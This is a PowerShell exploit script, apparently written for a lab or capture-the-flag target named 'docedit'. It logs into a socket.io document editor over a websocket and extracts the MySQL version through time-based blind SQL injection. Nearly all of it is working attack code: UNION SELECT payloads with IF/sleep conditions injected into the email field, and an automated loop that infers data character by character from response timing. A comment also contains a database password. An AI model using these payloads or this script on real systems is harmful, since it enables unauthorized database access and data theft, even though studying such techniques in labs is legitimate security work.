Import-Module -Name '.\PoshWebSocketClient'
$usr_email='test@test.com'
$usr_name='test'
$pass='test'
$register_user_str = "42[`"postRegister`",{`"firstName`":`"$usr_name`",`"lastName`":`"$usr_name`",`"email`":`"$usr_email`",`"password1`":`"$pass`",`"password2`":`"$pass`"}]"
$login_str = "42[`"postLogin`",{`"email`":`"$usr_email`",`"password`":`"$pass`"}]"
$save_doc_str = "42[`"saveDocument`",{{`"title`":`"<b>apples</b>`",`"content`":`"<b>apples</b>`",`"id`":`"1`",`"token`":`"{0}`"}}]"
$save_new_doc_str = "42[`"saveDocument`",{{`"title`":`"<b>apples</b>`",`"content`":`"<b>apples</b>`",`"token`":`"{0}`"}}]"


$check_email = "42[`"checkEmail`",{{`"token`":`"{0}`",`"email`":`"{1}`"}}]"
# sqli within the email field
$tag_email_str = "42[`"addTag`",{`"email`":`"{0}`",`"docid`":`"1`",`"token`":`"{1}`"}]"





$RegisterUser = @{
  SocketId = 0
  Message = $register_user_str
}
$LoginUser = @{
  SocketId = 0
  Message = $login_str
}

$SaveDoc = @{
  SocketId = 0
  Message = $save_doc_str
}

Write-Output "Initiating Connection"
Connect-Websocket -Uri "ws://docedit/socket.io/?EIO=3&transport=websocket&t=NMxgB5J&sid="
Receive-Message -SocketId 0 | out-Null
Receive-Message -SocketId 0 | Out-Null
$result = Send-Message -Message $register_user_str -SocketId 0
Write-Output "Registering User $($result.Status)"
Receive-Message -SocketId 0
#(Receive-Message -SocketId 0).Msg
$result = Send-Message -Message $login_str -SocketId 0
Write-Output "Logging In $($result.Status)"
$msg = Receive-Message -SocketId 0
$msg.msg
$json = $msg.Msg.substring(2)
$parsed_json = $json | ConvertFrom-Json
$token = $parsed_json.Token
$save_new_doc_str = $save_new_doc_str -f $token
$save_new_doc_str
$result = Send-Message -Message $save_new_doc_str -SocketId 0
Write-Output "Creating Document  $($result.Status)"
(Receive-Message -SocketId 0).Msg
(Receive-Message -SocketId 0).Msg
(Receive-Message -SocketId 0).Msg


# tag a user's email after creating a document, turns green on successful query, red on unsuccessfull query, and a secondary dialong mentioning 'Something went wrong during the queryerror during query' on sql syntax error
# searchByEmail on the user controller
# ' union select null,(select ascii(substring((select version()),1,1))=56),null,null,null,null,null,null-- 

<# Since the query always returns a statement I'm forced to use time based blind. 
' union select null,(SELECT IF((select ascii(substring((select version()),1,1))=56),(select sleep(10)), (select 'a'))),null,null,null,null,null,null-- 
#>

$strlen_sqli = "' union select null,(SELECT IF((select length(({0}))={1}),(select sleep(10)),(select 1))),null,null,null,null,null,null-- "
$extract_char_sqli = "' union select null,(SELECT IF((select ascii(substring(({0}),{1},1))={2}),(select sleep(10)),(select 1))),null,null,null,null,null,null-- "
# connect to mysql
# mysql --host=localhost --user=docedit --password=80c2680bb8b8113d57147c25bd371f2b7cffcfa22a9456d444f97ad6f92b70ce docedit

Write-Output "Calculating length of Version string"
$versionStrlen = 0
for($i = 1; $i -le 20; ++$i) {
  $guess = $check_email -f $token, ($strlen_sqli -f "select version()","$i")
  $guess
  $stopwatch = [System.Diagnostics.Stopwatch]::new()
  $stopwatch.Start()
  (Send-Message -Message $guess -SocketId 0).Msg
  (Receive-Message -SocketId 0).Msg
  $stopwatch.Stop()
  if($stopwatch.Elapsed.Seconds -ge 10) {
    Write-Output "Strlen: $i"
    Write-Output "Time Elapsed: $($stopwatch.Elapsed)"
    $versionStrlen = $i
    break
  }
  else {
    Write-Output "$($stopwatch.Elapsed)"
  }
}

$CharacterSets = @{
  versionAsciiChars = @('46','48','49','50','51','52','53','54','55','56','57')
  printableChars= 32..127
}
$mySQLVersion=""
for($i = 1; $i -le $versionStrlen; ++$i) {
  for($j = 0; $j -lt $CharacterSets.versionAsciiChars.length; ++$j) {
    #Write-Output "$($CharacterSets.versionAsciiChars[$j])"
    $guess = $check_email -f $token, ($extract_char_sqli -f "select version()","$i","$($CharacterSets.versionAsciiChars[$j])")
    #$guess

    $stopwatch = [System.Diagnostics.Stopwatch]::new()
    $stopwatch.Start()
    (Send-Message -Message $guess -SocketId 0).Msg
    (Receive-Message -SocketId 0).Msg | Out-Null
    $stopwatch.Stop()
    if($stopwatch.Elapsed.Seconds -ge 10) {
      $temp = [int]$CharacterSets.versionAsciiChars[$j]
      $temp
      $temp = [char]$temp
      Write-Output "Char Found: $temp"
      Write-Output "Time Elapsed: $($stopwatch.Elapsed)"
      $mySQLVersion += $temp
      break
    }
    else {
     # Write-Output "$($stopwatch.Elapsed)"
    }
  }
}

Write-Output "Mysql version: $mySQLVersion"



#(Receive-Message -SocketId 0).Msg


Remove-Module PoshWebSocketClient
